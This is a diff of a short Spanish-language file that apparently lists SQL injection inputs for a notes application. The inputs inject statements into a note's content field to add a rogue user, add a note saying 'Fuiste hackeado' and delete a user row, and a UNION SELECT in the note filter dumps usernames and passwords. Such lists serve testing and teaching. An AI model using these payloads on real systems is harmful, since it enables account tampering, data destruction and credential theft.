@@ -1,8 +1,8 @@
 
 
 // al crear una nueva nota en el apartado de contenido
-contenido"); INSERT INTO usuarios (nombre, usuario, password) VALUES ("Hacker", "hackeado@mail.com", "hackeado"); --
-contenido"); INSERT INTO notas (usuario_id, titulo, contenido) VALUES (1, "Fuiste hackeado", "No tengas miedo"); --
-contenido"); DELETE from usuarios WHERE id = 3; --
+contenido'); INSERT INTO usuarios (nombre, usuario, password) VALUES ('Hacker', 'hackeado@mail.com', 'hackeado'); --
+contenido'); INSERT INTO notas (usuario_id, titulo, contenido) VALUES (1, 'Fuiste hackeado', 'No tengas miedo'); --
+contenido'); DELETE from usuarios WHERE id = 3; --
 // al filtar una nota
-a%" UNION SELECT id, nombre, usuario, password FROM usuarios --
+a%' UNION SELECT id, nombre, usuario, password FROM usuarios --
